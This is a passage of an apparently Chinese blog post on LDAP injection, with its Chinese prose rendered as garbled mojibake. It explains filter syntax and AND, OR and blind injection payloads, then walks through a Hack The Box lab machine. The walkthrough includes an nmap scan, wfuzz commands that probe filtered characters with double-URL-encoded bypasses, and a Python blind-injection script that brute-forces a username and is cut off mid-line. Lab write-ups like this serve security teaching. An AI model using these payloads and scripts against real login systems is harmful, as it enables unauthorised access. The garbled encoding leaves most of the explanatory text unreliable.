¹å¯¹è±¡ç±»å°±å«åštopã€‚</p><p>ä¸Šè¿°å°±æ˜¯ç¬”è€…å¯¹LDAPæ•°æ®ç»“æ„çš„ç®€å•ä»‹ç»äº†ï¼ŒLDAPæ—¢ç„¶ä¸»è¦ç”¨äºæœç´¢æŸ¥è¯¢ï¼Œé‚£å®ƒæ˜¯æ€ä¹ˆæŸ¥è¯¢çš„å‘¢ï¼Ÿ</p><h3 id="LDAPçš„åŸºæœ¬è¯­æ³•">LDAPçš„åŸºæœ¬è¯­æ³•</h3><p>LDAPçš„è¯­æ³•éå¸¸ç®€å•ï¼Œä¸€çœ‹å°±ä¼šï¼Œå†çœ‹å°±æ‡‚ã€‚</p><blockquote><p>ä»¥ä¸‹éƒ¨åˆ†å†…å®¹æ‘˜è‡ªhttps://blog.csdn.net/leader_ww/article/details/4028672</p></blockquote><p><strong>=ï¼ˆç­‰äºï¼‰</strong></p><p>ä¾‹å¦‚ï¼Œå¦‚æœå¸Œæœ›æŸ¥æ‰¾å±æ€§<code>giveNname</code>å€¼ä¸ºJohnçš„æ‰€æœ‰å¯¹è±¡ï¼Œå¯ä»¥ä½¿ç”¨<code>(givenName=John)</code>ã€‚è¿™ä¼šè¿”å›å¯¹åº”æ¡ä»¶çš„æ‰€æœ‰å¯¹è±¡ã€‚</p><p><strong>&amp;ï¼ˆé€»è¾‘ä¸ï¼‰</strong></p><p>ä¾‹å¦‚ï¼Œå¦‚æœå¸Œæœ›æŸ¥æ‰¾å±…ä½åœ¨ Dallas å¹¶ä¸”<code>givenName</code>ä¸ºJohnçš„æ‰€æœ‰å¯¹è±¡ï¼Œå¯ä»¥ä½¿ç”¨<code>(&amp;(givenName=John)(l=Dallas))</code>ã€‚</p><p>è¯·æ³¨æ„ï¼Œæ¯ä¸ªå‚æ•°éƒ½è¢«å±äºå…¶è‡ªå·±çš„åœ†æ‹¬å·æ‹¬èµ·æ¥ã€‚æ•´ä¸ª LDAP è¯­å¥å¿…é¡»åŒ…æ‹¬åœ¨ä¸€å¯¹ä¸»åœ†æ‹¬å·ä¸­ã€‚æ“ä½œç¬¦ &amp; è¡¨æ˜ï¼Œåªæœ‰æ¯ä¸ªå‚æ•°éƒ½ä¸ºçœŸï¼Œæ‰ä¼šå°†æ­¤ç­›é€‰æ¡ä»¶åº”ç”¨åˆ°è¦æŸ¥è¯¢çš„å¯¹è±¡ã€‚</p><p><strong>|ï¼ˆé€»è¾‘æˆ–ï¼‰</strong></p><p>ä¾‹å¦‚ï¼Œå¦‚æœå¸Œæœ›æŸ¥æ‰¾å±æ€§<code>givenName</code>å€¼ä¸ºJhonæˆ–è€…Jackçš„æ‰€æœ‰å¯¹è±¡ï¼Œå¯ä»¥ä½¿ç”¨<code>(|(givenName=Jhon)(givenName=Jack))</code>ã€‚</p><p><strong>!ï¼ˆé€»è¾‘éï¼‰</strong></p><p>ä¾‹å¦‚ï¼Œå¦‚æœéœ€è¦æŸ¥æ‰¾<code>givenName</code>ä¸ºJohnçš„å¯¹è±¡ä»¥å¤–çš„æ‰€æœ‰å¯¹è±¡ã€‚åˆ™åº”ä½¿ç”¨å¦‚ä¸‹è¯­å¥ï¼š<code>(!givenName=John)</code></p><p><strong>*ï¼ˆé€šé…ç¬¦ï¼‰</strong></p><p>å¯ä½¿ç”¨é€šé…ç¬¦è¡¨ç¤ºå€¼å¯ä»¥ç­‰äºä»»ä½•å€¼ã€‚ä½¿ç”¨å®ƒçš„æƒ…å†µå¯èƒ½æ˜¯ï¼šæ‚¨å¸Œæœ›æŸ¥æ‰¾å…·æœ‰èŒåŠ¡å¤´è¡”çš„æ‰€æœ‰å¯¹è±¡ã€‚ä¸ºæ­¤ï¼Œå¯ä»¥ä½¿ç”¨<code>(title=*)</code>ï¼Œè¿™ä¼šè¿”å›<code>title</code>å±æ€§åŒ…å«å†…å®¹çš„æ‰€æœ‰å¯¹è±¡ã€‚</p><p>å¦ä¸€ä¸ªä¾‹å­æ˜¯ï¼šæ‚¨çŸ¥é“æŸä¸ªå¯¹è±¡çš„<code>givenName</code>å±æ€§çš„å¼€å¤´ä¸¤ä¸ªå­—æ¯æ˜¯â€œJoâ€ã€‚é‚£ä¹ˆï¼Œå¯ä»¥ä½¿ç”¨<code>(givenName=Jo*)</code>è¿›è¡ŒæŸ¥æ‰¾ï¼Œè¿™ä¼šè¿”å›<code>givenName</code>ä»¥<code>Jo</code>å¼€å¤´çš„æ‰€æœ‰å¯¹è±¡ã€‚</p><p>Over~~LDAPçš„è¯­æ³•æ˜¯ä¸æ˜¯å¾ˆç®€å•ã€‚</p><p>è¯´äº†è¿™ä¹ˆå¤šï¼Œå¯èƒ½å¾ˆå¤šå°ä¼™ä¼´è¿˜æ˜¯å¿ƒå­˜ç–‘é—®ï¼Œå·²ç»éƒ¨ç½²æˆåŠŸçš„LDAPåˆ°åº•æ˜¯é•¿ä»€ä¹ˆæ ·å­ï¼Ÿ</p><p>æˆ‘ä»¬å¯ä»¥é€šè¿‡Google Hacking <code>intitle:â€phpLDAPadminâ€ inurl:cmd.php</code>æ¥æ£€ç´¢ä¸€ä¸‹ï¼ŒçœŸå®çš„è¿è¡Œçš„LDAPæœåŠ¡çš„ç½‘ç«™ï¼Œè¿™ä¸ªåœ°æ–¹æˆ‘å°±è´´ä¸€å¼ å›¾ç¤ºèŒƒä¸€ä¸‹ï¼ŒåŒ…å«äº†ä¸Šé¢æåˆ°çš„æ‰€æœ‰æ¦‚å¿µã€‚</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200721151807.png" alt=""></p><h2 id="0x02-LDAPæ³¨å…¥æ”»å‡»é¢">0x02 LDAPæ³¨å…¥æ”»å‡»é¢</h2><p>å…¶å®å®ƒçš„æ”»å‡»æ‰‹æ³•å’ŒSQLæ³¨å…¥çš„åŸç†éå¸¸ç›¸ä¼¼ï¼Œåœ¨æœ‰æ¼æ´çš„ç¯å¢ƒä¸­ï¼Œè¿™äº›æŸ¥è¯¢å‚æ•°æ²¡æœ‰å¾—åˆ°åˆé€‚çš„è¿‡æ»¤ï¼Œå› è€Œæ”»å‡»è€…å¯ä»¥æ³¨å…¥ä»»æ„æ¶æ„ä»£ç ã€‚ç”±äºæ¯”è¾ƒç®€å•ï¼Œæˆ‘è¿™é‡Œå°±èµ°é©¬è§‚èŠ±çš„æ–¹å¼æ¥è¿‡ä¸€éLDAPæ³¨å…¥çš„ä¸åŒç±»å‹ã€‚</p><blockquote><p>ä»¥ä¸‹éƒ¨åˆ†å†…å®¹æ‘˜è‡ªhttps://wooyun.js.org/drops/LDAP%E6%B3%A8%E5%85%A5%E4%B8%8E%E9%98%B2%E5%BE%A1%E5%89%96%E6%9E%90.html</p></blockquote><h3 id="ANDæ³¨å…¥">ANDæ³¨å…¥</h3><p>è¿™ç§æƒ…å†µï¼Œåº”ç”¨ä¼šæ„é€ ç”±â€&amp;â€æ“ä½œç¬¦å’Œç”¨æˆ·å¼•å…¥çš„çš„å‚æ•°ç»„æˆçš„æ­£å¸¸æŸ¥è¯¢åœ¨LDAPç›®å½•ä¸­æœç´¢ï¼Œä¾‹å¦‚ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(&amp;(parameter1&#x3D;value1)(parameter2&#x3D;value2))</span><br></pre></td></tr></table></figure><p>è¿™é‡ŒValue1å’Œvalue2æ˜¯åœ¨LDAPç›®å½•ä¸­æœç´¢çš„å€¼ï¼Œæ”»å‡»è€…å¯ä»¥æ³¨å…¥ä»£ç ï¼Œç»´æŒæ­£ç¡®çš„è¿‡æ»¤å™¨ç»“æ„ä½†èƒ½ä½¿ç”¨æŸ¥è¯¢å®ç°ä»–è‡ªå·±çš„ç›®æ ‡ã€‚</p><p>æ¯”å¦‚è¯´ï¼Œä¸ºäº†éªŒè¯å®¢æˆ·ç«¯æä¾›çš„user/passwordå¯¹ï¼Œæ„é€ å¦‚ä¸‹LDAPè¿‡æ»¤å™¨å¹¶å‘é€ç»™LDAPæœåŠ¡å™¨ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(&amp;(USER&#x3D;Uname)(PASSWORD&#x3D;Pwd)) </span><br></pre></td></tr></table></figure><p>å¦‚æœæ”»å‡»è€…è¾“å…¥ä¸€ä¸ªæœ‰æ•ˆåœ°ç”¨æˆ·åï¼Œå¦‚r00tgrokï¼Œç„¶åå†è¿™ä¸ªåå­—åé¢æ³¨å…¥æ°å½“çš„è¯­å¥ï¼Œpasswordæ£€æŸ¥å°±ä¼šè¢«ç»•è¿‡ã€‚</p><p>ä½¿å¾—Uname=slisberger)(&amp;))ï¼Œå¼•å…¥ä»»ä½•å­—ç¬¦ä¸²ä½œä¸ºPwdå€¼ï¼Œæ„é€ å¦‚ä¸‹æŸ¥è¯¢å¹¶å‘é€ç»™æœåŠ¡å™¨ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(&amp;(USER&#x3D; slisberger)(&amp;)(PASSWORD&#x3D;Pwd))</span><br></pre></td></tr></table></figure><h3 id="ORæ³¨å…¥">ORæ³¨å…¥</h3><p>è¿™ç§æƒ…å†µï¼Œåº”ç”¨ä¼šæ„é€ ç”±â€|â€æ“ä½œç¬¦å’Œç”¨æˆ·å¼•å…¥çš„çš„å‚æ•°ç»„æˆçš„æ­£å¸¸æŸ¥è¯¢åœ¨LDAPç›®å½•ä¸­æœç´¢ï¼Œä¾‹å¦‚ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(|(parameter1&#x3D;value1)(parameter2&#x3D;value2))</span><br></pre></td></tr></table></figure><p>è¿™é‡ŒValue1å’Œvalue2æ˜¯åœ¨LDAPç›®å½•ä¸­æœç´¢çš„å€¼ï¼Œæ”»å‡»è€…å¯ä»¥æ³¨å…¥ä»£ç ï¼Œç»´æŒæ­£ç¡®çš„è¿‡æ»¤å™¨ç»“æ„ä½†èƒ½ä½¿ç”¨æŸ¥è¯¢å®ç°ä»–è‡ªå·±çš„ç›®æ ‡ã€‚</p><p>ç±»ä¼¼çš„ï¼ŒåŠ å…¥ç°åœ¨ç”¨äºå±•ç¤ºå¯ç”¨èµ„æºçš„æŸ¥è¯¢ä¸ºï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(|(type&#x3D;Rsc1)(type&#x3D;Rsc2))</span><br></pre></td></tr></table></figure><p>Rsc1å’ŒRsc2è¡¨ç¤ºç³»ç»Ÿä¸­ä¸åŒç§ç±»çš„èµ„æºã€‚å¦‚æœæ”»å‡»è€…è¾“å…¥<code>Rsc=printer)(uid=*)</code>ï¼Œåˆ™ä¸‹é¢çš„æŸ¥è¯¢è¢«å‘é€ç»™æœåŠ¡å™¨ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(|(type&#x3D;printer)(uid&#x3D;*))(type&#x3D;scanner)</span><br></pre></td></tr></table></figure><p>è¿™æ ·ä¹Ÿä¼šé€ æˆæ³¨å…¥çš„äº§ç”Ÿã€‚</p><h3 id="ç›²æ³¨">ç›²æ³¨</h3><p>SQLæ³¨å…¥ä¸­æœ‰ç›²æ³¨ï¼ŒLDAPä¸­ä¹Ÿå­˜åœ¨è¿™ç§é—®é¢˜ï¼ŒåŒ…æ‹¬ä¸‹é¢ä»‹ç»åˆ°çš„é¶æœºç”¨åˆ°çš„ä¹Ÿæ˜¯ç›²æ³¨çš„æ‰‹æ³•ã€‚</p><p>å‡è®¾æ”»å‡»è€…å¯ä»¥ä»æœåŠ¡å™¨å“åº”ä¸­æ¨æµ‹å‡ºä»€ä¹ˆï¼Œå°½ç®¡åº”ç”¨æ²¡æœ‰æŠ¥å‡ºé”™ä¿¡æ¯ï¼ŒLDAPè¿‡æ»¤å™¨ä¸­æ³¨å…¥çš„ä»£ç å´ç”Ÿæˆäº†æœ‰æ•ˆçš„å“åº”æˆ–é”™è¯¯ã€‚æ”»å‡»è€…å¯ä»¥åˆ©ç”¨è¿™ä¸€è¡Œä¸ºå‘æœåŠ¡å™¨é—®æ­£ç¡®çš„æˆ–é”™è¯¯çš„é—®é¢˜ã€‚</p><p>è¿˜æ˜¯ç”¨ä¸€ä¸ªä¾‹å­æ¥è¯´æ˜ã€‚</p><p>å‡è®¾ä¸€ä¸ªWebåº”ç”¨æƒ³ä»ä¸€ä¸ªLDAPç›®å½•åˆ—å‡ºæ‰€æœ‰å¯ç”¨çš„Epsonæ‰“å°æœºï¼Œé”™è¯¯ä¿¡æ¯ä¸ä¼šè¿”å›ï¼Œåº”ç”¨å‘é€å¦‚ä¸‹çš„è¿‡æ»¤å™¨ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(&amp;(objectClass&#x3D;printer)(type&#x3D;Epson*))</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨è¿™ä¸ªæŸ¥è¯¢ï¼Œå¦‚æœæœ‰å¯ç”¨çš„Epsonæ‰“å°æœºï¼Œå…¶å›¾æ ‡å°±ä¼šæ˜¾ç¤ºç»™å®¢æˆ·ç«¯ï¼Œå¦åˆ™æ²¡æœ‰å›¾æ ‡å‡ºç°ã€‚å¦‚æœæ”»å‡»è€…è¿›è¡ŒLDAPç›²æ³¨å…¥æ”»å‡»</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*)(objectClass&#x3D;*))(&amp;(objectClass&#x3D;void</span><br></pre></td></tr></table></figure><p>Webåº”ç”¨ä¼šæ„é€ å¦‚ä¸‹æŸ¥è¯¢ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(&amp;(objectClass&#x3D;*)(objectClass&#x3D;*))(&amp;(objectClass&#x3D;void)(type&#x3D;Epson*))</span><br></pre></td></tr></table></figure><p><strong>ä»…ç¬¬ä¸€ä¸ªLDAPè¿‡æ»¤å™¨ä¼šè¢«å¤„ç†</strong>ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(&amp;(objectClass&#x3D;*)(objectClass&#x3D;*))</span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆè¿™æ ·å°±å’Œæˆ‘ä»¬æŸ¥è¯¢çš„åˆè¡·ç›¸è¿èƒŒäº†ã€‚</p><p>æ¥ä¸‹æ¥å°±æ˜¯è¿™ç¯‡æ–‡ç« çš„é‡å¤´æˆäº†ï¼Œæˆ‘ä»¬ä¸»è¦ä»è¿™ä¸ªé¶æœºä¸­å­¦åˆ°ä¸¤ç‚¹ï¼š</p><ul><li>æ€ä¹ˆå‘ç°LDAPæ³¨å…¥æ¼æ´</li><li>å¦‚ä½•åˆ©ç”¨LDAPæ³¨å…¥æ¼æ´</li></ul><h2 id="0x03-ä»HTBé¶æœºä¸­å­¦ä¹ LDAPæ³¨å…¥">0x03 ä»HTBé¶æœºä¸­å­¦ä¹ LDAPæ³¨å…¥</h2><h3 id="Initial-Enunciation">Initial Enunciation</h3><p>æ‹¿åˆ°é¶æœºå…ˆç”¨Nmapæ‰«ä¸€ä¸‹ç«¯å£</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"># Nmap 7.80 scan initiated Fri Jul 10 10:50:40 2020 as: nmap -sC -sV -oN ctf 10.10.10.122</span><br><span class="line">Nmap scan report for ctf.htb (10.10.10.122)</span><br><span class="line">Host is up (1.8s latency).</span><br><span class="line">Not shown: 998 filtered ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22&#x2F;tcp open  ssh     OpenSSH 7.4 (protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   2048 fd:ad:f7:cb:dc:42:1e:43:7d:b3:d5:8b:ce:63:b9:0e (RSA)</span><br><span class="line">|   256 3d:ef:34:5c:e5:17:5e:06:d7:a4:c8:86:ca:e2:df:fb (ECDSA)</span><br><span class="line">|_  256 4c:46:e2:16:8a:14:f6:f0:aa:39:6c:97:46:db:b4:40 (ED25519)</span><br><span class="line">80&#x2F;tcp open  http    Apache httpd 2.4.6 ((CentOS) OpenSSL&#x2F;1.0.2k-fips mod_fcgid&#x2F;2.3.9 PHP&#x2F;5.4.16)</span><br><span class="line">|_http-server-header: Apache&#x2F;2.4.6 (CentOS) OpenSSL&#x2F;1.0.2k-fips mod_fcgid&#x2F;2.3.9 PHP&#x2F;5.4.16</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https:&#x2F;&#x2F;nmap.org&#x2F;submit&#x2F; .</span><br><span class="line"># Nmap done at Fri Jul 10 11:03:44 2020 -- 1 IP address (1 host up) scanned in 783.74 seconds</span><br></pre></td></tr></table></figure><p>æŸ¥çœ‹80ç«¯å£</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200710145257.png" alt=""></p><p>å¤§æ¦‚çš„æ„æ€å°±æ˜¯è®©æˆ‘ä»¬å°è¯•å»ç™»å½•è¿™ä¸ªç³»ç»Ÿï¼Œä½†æ˜¯ä¸èƒ½ç”¨SQLmapæˆ–è€…Dirbusterå»æš´åŠ›çŒœè§£ç”¨æˆ·åå’Œå¯†ç ã€‚</p><p>å†å»ç™»å½•ç•Œé¢çœ‹ä¸€ä¸‹ï¼š</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200710153946.png" alt=""></p><p>æç¤ºæˆ‘ä»¬æ˜¯ä¸€ä¸ªOTPï¼Œå³One Time Passwordï¼Œä¸€èˆ¬è€Œè¨€æ˜¯1åˆ†é’Ÿæ›´æ–°ä¸€æ¬¡ã€‚</p><p>æŸ¥çœ‹æºç ï¼Œå‘ç°æœ‰ä¸€ä¸ªHint</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200710154051.png" alt=""></p><blockquote><p>å¦‚æœæ¯”è¾ƒç†Ÿæ‚‰LDAPçš„è¯ï¼Œè¿™é‡Œçš„ä¸¤ä¸ªåè¯schemaå’Œexisting attributeå·²ç»æç¤ºäº†æ˜¯å…³äºLDAPæ³¨å…¥ã€‚</p></blockquote><p>ä½œè€…ç”¨ä¸€ä¸ªå·²çŸ¥çš„å±æ€§å»å­˜å‚¨äº†81ä½çš„token stringï¼ŒGoogleæœä¸€ä¸‹<code>token string (81 digits)</code>ã€‚</p><blockquote><p><a href="https://www.systutorials.com/docs/linux/man/1-stoken/">https://www.systutorials.com/docs/linux/man/1-stoken/</a></p></blockquote><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200710154249.png" style="zoom: 67%;" /><p>å¯ä»¥çœ‹åˆ°ä¸€ä¸ªå…³é”®çš„åœ°æ–¹ï¼Œ<code>Pure numeric (81-digit) &quot;ctf&quot; (compressed token format) strings</code>ï¼Œå’Œé¶æœºçš„é¢˜ç›®ç›¸å¥‘åˆï¼Œç°åœ¨å°±æœ‰ä¸€ç‚¹æ€è·¯äº†ï¼Œåº”è¯¥è¦å»æ‰¾åˆ°è¿™ä¸ª81ä½çº¯æ•°å­—çš„tokenï¼Œç„¶åç”¨stokenå·¥å…·å»ç”ŸæˆOTPã€‚é‚£ä¹ˆä¸»è¦æ˜¯æ‰¾åˆ°tokenï¼Œå”¯ä¸€å¯ä»¥åˆ©ç”¨çš„å°±æ˜¯è¿™ä¸ªç™»å½•æ¡†äº†ã€‚</p><p>å…ˆéšä¾¿ç”¨æŸä¸ªç”¨æˆ·åå’Œå¯†ç ç™»å½•<code>admin:1234</code></p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200710164835.png" alt=""></p><p>è¿”å›<code>User admin not found</code>ï¼Œå†ç”¨SQLæ³¨å…¥çš„ä¸‡èƒ½å¯†ç è¯•ä¸€è¯•</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200710164644.png" alt=""></p><p>ç›´æ¥æ˜¯æ²¡æœ‰ä»»ä½•æ˜¾ç¤ºï¼Œåº”è¯¥æ˜¯å¯¹ä¸€äº›ç‰¹æ®Šå­—ç¬¦æœ‰é»‘åå•è¿‡æ»¤ã€‚Fuzzä¸€ä¸‹è¿‡æ»¤äº†ä¸€äº›ä»€ä¹ˆå­—ç¬¦</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wfuzz -c --hw 233 -d &#39;inputUsername&#x3D;FUZZ&amp;inputOTP&#x3D;1234&#39; -w special-chars.txt 10.10.10.122&#x2F;login.php</span><br></pre></td></tr></table></figure><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200710165335.png" alt=""></p><blockquote><p>â€“hw 233 ä»£è¡¨è¿‡æ»¤æ‰å½¢å¦‚<code>User xxx not found</code>çš„è¿”å›ä¿¡æ¯ã€‚</p></blockquote><p>æˆ‘ä»¬å‘ç°<code>+</code>å’Œ<code>&amp;</code>è¿”å›çš„æ˜¯232 Wordsï¼Œä½†æ˜¯åœ¨é¡µé¢æµ‹è¯•ä¸€ä¸‹</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200710173607.png" alt=""></p><p>å‘ç°è¿”å›çš„è¿˜æ˜¯<code>User + not found</code>æˆ–è€…<code>User &amp; not found</code>ï¼Œè¿™æ ·çš„è¯åº”è¯¥æ˜¯233 Wordsï¼Œè€Œä¸æ˜¯Wfuzzè¿”å›çš„232 Wordsã€‚</p><p>æˆ‘ä»¬å°è¯•æŠŠè¿™äº›ç‰¹æ®Šå­—ç¬¦äºŒæ¬¡URLç¼–ç ï¼Œçœ‹Webåº”ç”¨æ˜¯å¦è¿˜èƒ½è§£æï¼Œç”¨seclistsä¸­çš„doble_uri_hex.txtä½œä¸ºå­—å…¸</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wfuzz -c --hw 233 -d &#39;inputUsername&#x3D;FUZZ&amp;inputOTP&#x3D;1234&#39; -w doble-uri-hex.txt 10.10.10.122&#x2F;login.php</span><br></pre></td></tr></table></figure><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200710193655.png" alt=""></p><p>æœ€åFuzzå‡ºæ¥çš„è¢«è¿‡æ»¤çš„å­—ç¬¦å°±æ˜¯</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">%2500 ---&gt; %00</span><br><span class="line">%2528 ---&gt; (</span><br><span class="line">%2529 ---&gt; )</span><br><span class="line">%252a ---&gt; *</span><br><span class="line">%255c ---&gt; \</span><br></pre></td></tr></table></figure><p>è¿™äº›è¢«è¿‡æ»¤çš„å­—ç¬¦å°±æ˜¯LDAPæ³¨å…¥éœ€è¦è¿‡æ»¤çš„æ‰€æœ‰å­—ç¬¦ï¼Œå†ç»“åˆ<code>login.php</code>é¡µé¢æºä»£ç ä¸­çš„hintï¼Œå¯ä»¥ç¡®å®šæ˜¯LDAPæ³¨å…¥ã€‚</p><h3 id="Getting-User-Access">Getting User Access</h3><p>å…ˆæ¥çœ‹LDAPæ³¨å…¥çš„æœ€åŸºæœ¬å½¢å¼</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">(&amp;</span><br><span class="line">(password&#x3D;1234)</span><br><span class="line">(uid&#x3D;ca01h%00)</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>å…·ä½“åˆ°è¿™ä¸ªé¶æœºçš„è¯ï¼Œæˆ‘ä»¬éœ€è¦çŒœè§£æ‹¬å·çš„ä¸ªæ•°ã€‚è¿ç”¨ç±»ä¼¼ç›²æ³¨çš„æ€æƒ³ï¼Œå¦‚æœæ³¨å…¥æˆåŠŸï¼Œé‚£ä¹ˆå°±ä¼šè¿”å›<code>User ca01h not found</code>ã€‚</p><p>å‡è®¾åªæœ‰ä¸€ä¸ªæ‹¬å·ï¼š</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200710202659.png" alt=""></p><p>å‡è®¾æœ‰ä¸¤ä¸ªæ‹¬å·ï¼š</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200710202740.png" alt=""></p><p>å‡è®¾æœ‰ä¸‰ä¸ªæ‹¬å·ï¼š</p><p><img src="C:%5CUsers%5C51196%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200710202913036.png" alt="image-20200710202913036"></p><p>å½“å°è¯•åˆ°ä¸‰ä¸ªæ‹¬å·ç”¨äºé—­åˆæ—¶ï¼ŒæˆåŠŸè¿”å›äº†<code>User ca01h%29%29%29%00 not found</code>ï¼Œé‚£ä¹ˆè¿™ä¸ªç™»å½•æ¡†çš„LDAPæŸ¥è¯¢çš„åŸºæœ¬å½¢å¼å°±æ˜¯</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">(&amp;</span><br><span class="line">(&amp;</span><br><span class="line">(password&#x3D;1234)</span><br><span class="line">(uid&#x3D;ca01h)))%00</span><br><span class="line">)</span><br><span class="line">(&amp;|</span><br><span class="line">(other comparing)</span><br><span class="line">)</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>æ¥ç€ï¼Œæˆ‘ä»¬å†å›å¤´å»çœ‹ä¸€ä¸‹Fuzzå‡ºæ¥çš„è¢«è¿‡æ»¤çš„å­—ç¬¦ï¼Œå…¶ä¸­<code>%25%2a</code>è¿”å›çš„æ¶ˆæ¯é•¿åº¦ä¸º231 Words</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200710203938.png" alt=""></p><p>å‘ç°å›æ˜¾çš„æ¶ˆæ¯æ˜¯<code>Cannot login</code>ï¼Œè¯´æ˜å¯ä»¥ç”¨<code>*</code>é€šé…ç¬¦æ¥ç›²æ³¨ç”¨æˆ·åï¼Œè„šæœ¬å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment">### username_burp.py</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> string <span class="keyword">import</span> ascii_lowercase</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote_plus</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">URL = <span class="string">&#x27;http://10.10.10.122/login.php&#x27;</span></span><br><span class="line"></span><br><span class="line">username, done = <span class="string">&#x27;&#x27;</span>, <span class="literal">False</span></span><br><span class="line">print()</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">not</span> done:</span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> ascii_lowercase:</span><br><span class="line">payload = username + c + quote_plus(<span class="string">&#x27;*&#x27;</span>)</span><br><span class="line"></span><br><span class="line">data = &#123;</span><br><span class="line"><span class="string">&#x27;inputUsername&#x27;</span>: payload,</span><br><span class="line"><span class="string">&#x27;inputOTP&#x27;</span>: <span class="string">&#x27;1234&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">resp = requests.post(URL, data=data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="string">&#x27;Cannot login&#x27;</span> <span class="keyword">in</span> resp.text:</span><br><span class="line">username += c</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        sys.stdout.write(<span 